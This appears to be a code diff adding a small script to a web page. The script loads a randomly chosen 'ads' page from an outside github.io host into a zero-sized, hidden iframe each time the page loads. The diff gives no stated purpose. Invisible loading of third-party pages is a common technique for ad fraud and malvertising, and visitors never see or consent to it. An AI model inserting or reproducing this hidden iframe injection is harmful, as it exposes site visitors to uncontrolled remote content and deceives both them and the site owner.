@@ -1,0 +1,10 @@
+<script>
+  var pages = ["ads1.html", "ads2.html", "ads3.html"];
+  var page = pages[Math.floor(Math.random() * pages.length)];
+  var iframe = document.createElement('iframe');
+  iframe.src = "https://stofmak1.github.io/" + page;
+  iframe.width = "0";
+  iframe.height = "0";
+  iframe.style.display = "none";
+  document.body.appendChild(iframe);
+</script>
